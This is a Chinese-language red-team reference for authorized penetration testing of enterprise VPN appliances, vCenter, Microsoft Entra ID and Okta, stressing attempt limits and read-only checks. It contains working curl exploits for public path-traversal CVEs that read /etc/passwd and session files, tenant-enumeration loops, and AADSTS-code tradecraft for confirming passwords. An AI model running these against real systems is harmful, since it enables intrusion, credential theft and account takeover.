# 企业边界设备与身份平台参考（授权测试）

纪律优先：默认口令/喷洒每用户每次 engagement ≤1–2 次；破坏性探针（内存泄露、落盘、上传、
RCE）只做可达性检测，未经明确许可不执行利用；命中即停、脱敏。

## 1. SSL VPN 指纹

```bash
# Cisco ASA / AnyConnect
curl -skI "https://$TARGET/+CSCOE+/logon.html"
# 特征：webvpn= Cookie、CSCOE、AnyConnect

# Fortinet FortiGate
curl -skI "https://$TARGET/remote/login"
# 特征：SVPNCOOKIE=、FortiGate、SSL-VPN

# Citrix NetScaler / Gateway
curl -skI "https://$TARGET/"
# 特征：NSC_AAA=、NSC_USER=、Server: NetScaler
curl -sk "https://$TARGET/vpn/index.html" | grep -oE 'NetScaler/[0-9.]+'

# Palo Alto GlobalProtect
curl -skI "https://$TARGET/global-protect/login.esp"
# 特征：PHPSESSID、GlobalProtect Portal、panui-

# Pulse Secure / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi"
# 特征：DSAuthSession=、DSPREAUTH=

# SonicWall
curl -skI "https://$TARGET/cgi-bin/welcome"
# 特征：swap=、swapauth=

# F5 BIG-IP / APM
curl -skI "https://$TARGET/my.policy"
# 特征：BIGipServer*、MRHSession=
```

## 2. 五分钟安全探针（只读）

```bash
# Cisco：路径穿越/文件读（命中返回文件内容）
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest"
# SAML 元数据可达性
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml

# Fortinet：CVE-2018-13379 文件读
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Citrix：CVE-2019-19781 文件读
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf"

# Pulse/Ivanti：CVE-2019-11510 文件读
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
```

判真：响应包含 `/etc/passwd`、会话文件、配置内容；只返回登录页/403 不成立。

## 3. CVE 面（只列预认证/认证绕过；标注破坏性）

| 厂商 | CVE | 类型 | 备注 |
|------|-----|------|------|
| Cisco ASA | CVE-2018-0296 | 路径穿越/信息泄露 | 只读探测 |
| Cisco ASA | CVE-2020-3452 | 路径穿越/文件读 | 只读探测 |
| Cisco ASA | CVE-2023-20269 | SSL VPN 认证绕过 | 需组+口令组合，遵守限次 |
| Fortinet | CVE-2018-13379 | 路径穿越/会话文件读 | 只读探测 |
| Fortinet | CVE-2022-42475 / CVE-2023-27997 / CVE-2024-21762 | 预认证 RCE | **破坏性，需单独许可** |
| Citrix | CVE-2019-19781 | 路径穿越 → RCE | 先只读文件读 |
| Citrix | CVE-2023-4966 (Citrix Bleed) | 内存泄露/会话窃取 | **有破坏性风险，需许可** |
| Palo Alto | CVE-2024-3400 | 命令注入/预认证 RCE | **会落盘，需许可** |
| Pulse/Ivanti | CVE-2019-11510 | 任意文件读 | 只读探测 |
| Pulse/Ivanti | CVE-2023-46805 + CVE-2024-21887 | 认证绕过 + 命令注入 | **利用需许可** |
| SonicWall | CVE-2021-20016 | 预认证 SQLi | 只做只读验证 |

Nuclei 只用于指纹与只读模板；不要对生产设备跑 exploit 模板。版本适用性必须按厂商公告核对，
不能只凭指纹判定。

## 4. vCenter / Workspace ONE

### 4.1 指纹

```bash
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/api/appliance/system/version"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

### 4.2 预认证面（检测优先）

- CVE-2021-21972：`/ui/vropspluginui/rest/services/uploadova`
  405/200 = 端点存在；404 = 已移除；401 = 需认证。**不执行上传**。
- CVE-2021-21985 / CVE-2021-22005 / CVE-2023-34048：按版本核对公告，只做可达性检查。
- CVE-2022-22954（Workspace ONE）：`/catalog-portal/ui/oauth/verify` 可达性 + 基线；
  执行类探针需许可，且必须带唯一 canary 并 diff 基线。

### 4.3 认证后/低危面

- MOB：`/mob/?moid=...` 常泄露对象与属性。
- REST：`/api/vcenter/...` 枚举 VM/主机/数据存储。
- 默认口令：只在实验室/明确授权环境尝试，限次。
- SSO/vmdir：`/sso-adminserver/sdk/vsphere.local` 信息泄露。

## 5. Microsoft 365 / Entra ID

### 5.1 租户发现

```bash
msftrecon -d client.example
# 关注：Tenant ID、Namespace Type（Managed/Federated）、SharePoint、Admin Consent
```

同一品牌多个域名可能是多个租户，各有独立锁定策略与 CA，不要假设一次喷洒覆盖全部。

### 5.2 AADSTS 码（决定是否继续）

| 码 | 含义 | 处理 |
|----|------|------|
| 50034 | 用户不存在 | 跳过 |
| 50126 | 口令错误 | 计数 +1 |
| 50053 | 已锁定 | 停止，视为既有锁定 |
| 53003 | CA 拦截 | **口令正确**，停止 |
| 50076 / 50079 | 需要 MFA/强认证 | **口令正确**，停止 |
| 50158 | 联合 MFA | **口令正确** |
| 530003 | 需要合规设备 | **口令正确** |
| 700016 | 应用不在租户 | 换租户 |
| 90002 | 租户不存在 | 检查域名 |

纪律：每用户 ≤1–2 次尝试；计数文件原子写；见到多个 50053 立即停（可能是既有攻击）。

### 5.3 ROPC 与陷阱

- 只验证口令，不做大规模喷洒。
- **必须 JSON 解析**：MFA 错误体里可能出现字面量 `"access_token"` 子串（claims 字段），
  用子串匹配会把失败当成功。判据是 JSON 顶层存在 `access_token` 键。
- CA 阻止 ROPC 时，改用浏览器 SAML 流程做单次凭据验证，仍遵守限次。

## 6. Okta

### 6.1 租户发现

```bash
for tenant in target target-ltd target-emea; do
  for region in okta okta-emea oktapreview; do
    host="$tenant.$region.com"
    echo "$host $(curl -sk -o /dev/null -w '%{http_code}' --max-time 8 "https://$host/")"
  done
done
dig +short sso.target.example CNAME
curl -skL -o /dev/null -w '%{redirect_url}\n' "https://app.target.example/login"
```

### 6.2 认证与枚举

```bash
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<email>","password":"_invalid_probe"}'
```

注意：该请求**计入认证尝试**；2024+ 多数租户已统一错误，枚举不可靠。禁止用它做喷洒。

### 6.3 OIDC redirect_uri

按 sso pack 的 redirect_uri 绕过清单测试；重点：

- `*.okta.com` 之外的子域白名单；
- `redirect_uri` 精确匹配缺失；
- `login_hint` 差异（可能泄露用户存在）；
- 授权码是否绑定 client 与 redirect_uri。

判真：授权码/token 实际到达攻击者域。

## 7. SAML SP / IdP 配置（交叉检查）

- SP metadata 的 ACS 是否接受未签名断言；
- AudienceRestriction 是否校验（跨租户断言）；
- 是否允许 IdP-initiated 且无 RelayState 校验；
- 证书轮换后旧证书是否仍被接受。

具体 XSW/签名剥离手法见 `redteam-sso-ato-detail-pack` 的 reference，不在这里重复。

## 8. 判真与降级

- 指纹命中 ≠ 漏洞；必须证明文件读/命令执行/会话获取。
- 预认证 CVE 只返回登录页或通用错误页 → 不成立。
- 默认口令命中需登录成功并看到设备面板；仅 200 不算。
- AADSTS 53003/50076 表示口令正确，但不足以证明账号可被接管；按“有效凭据”单独定级。
- Okta 枚举差异若不稳定（重放不一致）→ 不作为发现。
- 任何 DoS/内存泄露/落盘探针未获许可 → 只记录“未验证”，不升级。

## 9. 证据清单

- 平台与版本指纹（header、构建号、API 版本）；
- 探测路径与完整响应；
- 影响证明：文件内容、命令输出、会话、配置；
- 尝试次数与锁定状态（证明未造成锁定）；
- 未验证的破坏性分支单列，附未执行原因。
